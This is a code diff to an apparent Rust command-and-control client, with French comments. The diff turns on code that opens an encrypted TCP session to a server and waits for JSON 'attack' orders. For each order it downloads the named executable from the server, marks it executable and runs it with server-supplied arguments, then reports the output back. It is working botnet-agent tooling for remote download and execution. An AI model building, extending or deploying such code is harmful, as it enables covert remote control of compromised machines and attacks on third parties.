@@ -3,7 +3,7 @@ mod connexion;
 // use std::borrow::Borrow;
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-use std::thread;
+// use std::thread;
 use std::str;
 // use std::sync::mpsc;
 
@@ -18,17 +18,17 @@ use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvI
 use serde::{Deserialize, Serialize};
 use generic_array::GenericArray;
 use base64::{Engine as _, engine::general_purpose};
-// use std::fs::{self, File};
-// use std::path::Path;
+use std::fs::{self, File};
+use std::path::Path;
 
 type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
-// use std::process::{Command};
+use std::process::{Command};
 use std::time::Duration;
 
 #[cfg(client_os = "linux")]
-// use std::os::unix::fs::PermissionsExt;
+use std::os::unix::fs::PermissionsExt;
 
 // JSON config handshake
 #[derive(Serialize, Deserialize)]
@@ -110,41 +110,16 @@ fn send_encrypted_data_to_server(
 }
 
 
-// // Send data to server as bytes vector to the server
-// fn send_encrypted_data_to_server(
-//     sender: mpsc::Sender<Vec<u8>>,
-//     data: Vec<u8>,
-//     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
-//     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
-// ) {
-//     // let data_as_bytes = data.as_bytes().to_vec();
-//     let mut buffer = vec![0u8; data.len() + 16]; // Adjust buffer size
-//     let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
-//         .encrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
-//         .unwrap();
-
-//     let data_len = encrypted_data.len().to_string();
-//     println!("Data len to send : {}", data_len);
-
-//     let encrypted_data_len = Aes128CbcEnc::new(&symetric_key, &iv)
-//     .encrypt_padded_b2b_mut::<Pkcs7>(&data_len.as_bytes(), &mut buffer)
-//     .unwrap();
-
-//     if sender.send(encrypted_data.to_vec()).is_err() {
-//         eprintln!("Error sending data");
-//     }
-// }
-
 // Send string to server
-// fn send_encrypted_string_to_server(
-//     stream: TcpStream,
-//     data: String,
-//     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
-//     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
-// ) {
-//     let data_as_bytes = data.as_bytes().to_vec();
-//     send_encrypted_data_to_server(stream, data_as_bytes, symetric_key, iv)
-// }
+fn send_encrypted_string_to_server(
+    stream: TcpStream,
+    data: String,
+    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
+    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
+) {
+    let data_as_bytes = data.as_bytes().to_vec();
+    send_encrypted_data_to_server(stream, data_as_bytes, symetric_key, iv)
+}
 
 
 // Receive encrypted data from server
@@ -184,14 +159,14 @@ fn receive_encrypted_data_from_server(
     let mut enc_data_buffer = vec![0u8; data_size];
     match stream.read_exact(&mut enc_data_buffer) {
         Ok(()) => {
-            println!("[+] Data size received successfully!");
+            println!("[+] Data received successfully!");
         }
         Err(err) => {
             eprintln!("Erreur lors de la lecture: {}", err);
         }
     }
 
-    let mut data_buffer = vec![0u8; 16];
+    let mut data_buffer = vec![0u8; data_size];
     match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&enc_data_buffer, &mut data_buffer) {
         Ok(data) => { 
             
@@ -285,146 +260,118 @@ fn receive_encrypted_file_from_server(
 
 
 
-// fn check_and_request_executable(
-//                                     executable_name: &str,
-//                                     executable_dir: &str,
-//                                     sender: &mpsc::Sender<Vec<u8>>,
-//                                     receiver: &mpsc::Receiver<Vec<u8>>,
-//                                     symetric_key: &GenericArray<u8, typenum::consts::U16>,
-//                                     iv: &GenericArray<u8, typenum::consts::U16>,
-//                                     connexion: TcpStream
-//                                     ) -> io::Result<()> {
+fn check_and_request_executable(
+                                    executable_name: &str,
+                                    executable_dir: &str,
+                                    symetric_key: &GenericArray<u8, typenum::consts::U16>,
+                                    iv: &GenericArray<u8, typenum::consts::U16>,
+                                    stream: TcpStream
+                                    ) -> io::Result<()> {
 
-//     #[cfg(client_os = "windows")]
-//     let executable_path = Path::new(executable_dir).join(executable_name).with_extension("exe");
+    #[cfg(client_os = "windows")]
+    let executable_path = Path::new(executable_dir).join(executable_name).with_extension("exe");
 
-//     #[cfg(client_os = "linux")]
-//     let executable_path = Path::new(executable_dir).join(executable_name);
+    #[cfg(client_os = "linux")]
+    let executable_path = Path::new(executable_dir).join(executable_name);
     
-//     println!("\t[?] Checking if executable exists at {:?}", executable_path);
+    println!("\t[?] Checking if executable exists at {:?}", executable_path);
 
-//     if !executable_path.exists() {
-//         println!("\t[!] Executable not found, requesting from server...");
+    if !executable_path.exists() {
+        println!("\t[!] Executable not found, requesting from server...");
 
-//         loop{
-//             // Envoi du json de requete pour l'executable
-//             let request_message = format!("{{\"request\":\"{}\"}}", executable_name);
-//             send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
-//             println!("\t\t[+] Request sent");
+        loop{
+            // Envoi du json de requete pour l'executable
+            let request_message = format!("{{\"request\":\"{}\"}}", executable_name);
+            send_encrypted_string_to_server(stream.try_clone()?, request_message, symetric_key.clone(), iv.clone());
+            println!("\t\t[+] Request sent");
 
-        
-//             // négociation de la taille du fichier
-//             let file_size = receive_encrypted_string_from_server(receiver, symetric_key.clone(), iv.clone());
-//             println!("\t\t[+] file size received : {:?}", file_size);
-    
-    
-//             println!("\t\t[+] sending back file size");
-//             send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());
-    
-            
-//             // Attente d el'envoi du fichier
-            
-//             println!("\t\t[+] waiting for file data");
-//             match receive_encrypted_file_from_server(connexion.try_clone()?, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap()){
-//                 Ok(data_file) => {
-//                     println!("\t\t[+] file data received");
+
+            // Attente de l'envoi du fichier
+            println!("\t\t[+] waiting for file data");
+            match receive_encrypted_data_from_server(stream.try_clone()?, symetric_key.clone(), iv.clone()){
+                Ok(data_file) => {
+                    println!("\t\t[+] file data received");
                     
-//                     let mut file = File::create(&executable_path)?;
-//                     file.write_all(&data_file)?;
+                    let mut file = File::create(&executable_path)?;
+                    file.write_all(&data_file)?;
 
-//                     #[cfg(client_os = "linux")]
-//                     {
-//                         let metadata = file.metadata()?;
-//                         let mut permissions = metadata.permissions();
-//                         permissions.set_mode(0o755); // rwxr-xr-x
-//                         fs::set_permissions(&executable_path, permissions)?;
-//                     }
+                    #[cfg(client_os = "linux")]
+                    {
+                        let metadata = file.metadata()?;
+                        let mut permissions = metadata.permissions();
+                        permissions.set_mode(0o755); // rwxr-xr-x
+                        fs::set_permissions(&executable_path, permissions)?;
+                    }
 
-//                     break;
+                    break;
 
-//                 }
-//                 Err(e) => {
-//                     println!("\t\t[!] Mauvais fichier recu : {}", e);
-//                 }
-//             }
-//             // thread::sleep(Duration::new(1, 0));
-//         }
-
-
-//         println!("\t\t[+] Executable received and stored at {:?}", executable_path);
-//     } else {
-//         println!("\t[+] Executable found at {:?}", executable_path);
-//         // send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
-//     }
-
-//     Ok(())
-// }
-
-// fn execute_attack(
-//     attack_name: &str,
-//     args: &str,
-//     sender: &mpsc::Sender<Vec<u8>>,
-//     receiver: &mpsc::Receiver<Vec<u8>>,
-//     symetric_key: &GenericArray<u8, typenum::consts::U16>,
-//     iv: &GenericArray<u8, typenum::consts::U16>,
-//     connexion: TcpStream
-// ) ->  io::Result<String> {
-//     let executable_dir = "./actions";
-
-//     check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv, connexion)?;
-
-//     #[cfg(client_os = "windows")]
-//     let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
-
-//     #[cfg(client_os = "linux")]
-//     let executable_path = Path::new(executable_dir).join(attack_name);
-
-//     // Run the executable with argument `10` and capture the output
-//     println!("[+] Lancement de l'attaque: {}", attack_name);
-
-//     // Split the args string into separate arguments
-//     let args: Vec<&str> = args.split_whitespace().collect();
+                }
+                Err(e) => {
+                    println!("\t\t[!] Mauvais fichier recu : {:?}", e);
+                }
+            }
+            // thread::sleep(Duration::new(1, 0));
+        }
 
 
-//     println!("{:?}", Command::new(&executable_path).args(&args));
-//     let output = Command::new(&executable_path).args(&args).output()?; 
-//     println!("output: {:?}", output);
+        println!("\t\t[+] Executable received and stored at {:?}", executable_path);
+    } else {
+        println!("\t[+] Executable found at {:?}", executable_path);
+        // send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
+    }
+
+    Ok(())
+}
+
+fn execute_attack(
+    attack_name: &str,
+    args: &str,
+    symetric_key: &GenericArray<u8, typenum::consts::U16>,
+    iv: &GenericArray<u8, typenum::consts::U16>,
+    stream: TcpStream,
+) ->  io::Result<String> {
+    let executable_dir = "./actions";
+
+    check_and_request_executable(attack_name, executable_dir, symetric_key, iv, stream)?;
+
+    #[cfg(client_os = "windows")]
+    let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
+
+    #[cfg(client_os = "linux")]
+    let executable_path = Path::new(executable_dir).join(attack_name);
+
+    // Run the executable with argument `10` and capture the output
+    println!("[+] Lancement de l'attaque: {}", attack_name);
+
+    // Split the args string into separate arguments
+    let args: Vec<&str> = args.split_whitespace().collect();
+
+
+    println!("{:?}", Command::new(&executable_path).args(&args));
+    let output = Command::new(&executable_path).args(&args).output()?; 
+    println!("output: {:?}", output);
     
 
-//     // Check if the command was successful
-//     if output.status.success() {
-//         // Convert stdout to a string
-//         let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-//         println!("[+] Attaque Exécutée: {}", attack_name);
-//         Ok(stdout)
-//     } else {
-//         // Convert stderr to a string and return an error
-//         let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-//         println!("[+] Attaque Exécutée: {}", attack_name);
-//         Err(io::Error::new(io::ErrorKind::Other, stderr))
-//     }
+    // Check if the command was successful
+    if output.status.success() {
+        // Convert stdout to a string
+        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+        println!("[+] Attaque Exécutée: {}", attack_name);
+        Ok(stdout)
+    } else {
+        // Convert stderr to a string and return an error
+        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+        println!("[+] Attaque Exécutée: {}", attack_name);
+        Err(io::Error::new(io::ErrorKind::Other, stderr))
+    }
 
     
-// }
+}
 
 fn main() -> io::Result<()> {
     // Connexion
     let mut stream: TcpStream = connexion::connexion()?;
-    // let connexion2: TcpStream = stream.try_clone()?;
-    // let connexion3: TcpStream = stream.try_clone()?;
 
-    // thread emission
-    // let (sender, rx) = mpsc::channel::<Vec<u8>>();
-    // let sender_clone = sender.clone();
-    // let _thread_emission = thread::spawn(move || {
-    //     connexion::emission(connexion2, rx);
-    // });
-
-    // thread reception
-    // let (tx2, receiver) = mpsc::channel::<Vec<u8>>();
-    // let _thread_reception = thread::spawn(move || {
-    //     connexion::reception(connexion3, tx2);
-    // });
 
     // ========== HANDSHAKE ==========
     println!("[+] starting Handshake");
@@ -515,50 +462,37 @@ fn main() -> io::Result<()> {
     // ========== END HANDSHAKE ==========
     let stream_clone = stream.try_clone().expect("Error while cloning stream in thread");
 
-    let _thread_test = thread::spawn(move || {
-        // let mut response = String::new();
-
-        loop {
-            let stream_clone_clone = stream_clone.try_clone().expect("Error while cloning stream in thread");
-            let message = receive_encrypted_string_from_server(stream_clone_clone, symetric_key.clone(), iv.clone());
-
-            println!("Message reçu : {}", message);
-
-            // if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
-            //     println!("[?] instruction reçue : {}", json_attack.attack);
-
-            //     let id_attack = json_attack.id;
-            //     let type_attack = json_attack.attack;
-
-            //     let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
-
-            //     match execute_attack(type_attack.clone().as_str(), &args , &sender, &receiver, &symetric_key, &iv, stream.try_clone().expect("REASON")) {
-            //         Ok(output) => {
-            //             let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
-            //             send_encrypted_string_to_server(stream, response, symetric_key.clone(), iv.clone());
-            //         }
-            //         Err(e) => {
-            //             let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
-            //             send_encrypted_string_to_server(stream, response, symetric_key.clone(), iv.clone());
-            //             println!("Error executing attack: {}", e);
-            //         }
-            //     }
-            // }
-        }
-    });
 
     loop {
-        let mut input = String::new();
-        println!("Entrez un message : ");
-        match io::stdin().read_line(&mut input) {
-            Ok(_) => {
-                println!("{}", input);
-                let stream_clone = stream.try_clone()?;
-                send_encrypted_data_to_server(stream_clone, input.as_bytes().to_vec(), symetric_key.clone(), iv.clone());
+        let stream_clone_clone = stream_clone.try_clone().expect("Error while cloning stream in thread");
+        let message = receive_encrypted_string_from_server(stream_clone_clone, symetric_key.clone(), iv.clone());
+
+        println!("Message reçu : {}", message);
+
+
+        if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
+            println!("[?] instruction reçue : {}", json_attack.attack);
+
+            let id_attack = json_attack.id;
+            let type_attack = json_attack.attack;
+
+            let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
+
+            match execute_attack(type_attack.clone().as_str(), &args , &symetric_key, &iv, stream_clone.try_clone().expect("REASON")) {
+                Ok(output) => {
+                    let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
+                    send_encrypted_string_to_server(stream_clone.try_clone().expect("REASON"), response, symetric_key.clone(), iv.clone());
+                }
+                Err(e) => {
+                    let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
+                    send_encrypted_string_to_server(stream_clone.try_clone().expect("REASON"), response, symetric_key.clone(), iv.clone());
+                    println!("Error executing attack: {}", e);
+                }
             }
-            Err(error) => println!("error: {}", error),
         }
     }
+
+    Ok(())
 }
 
 
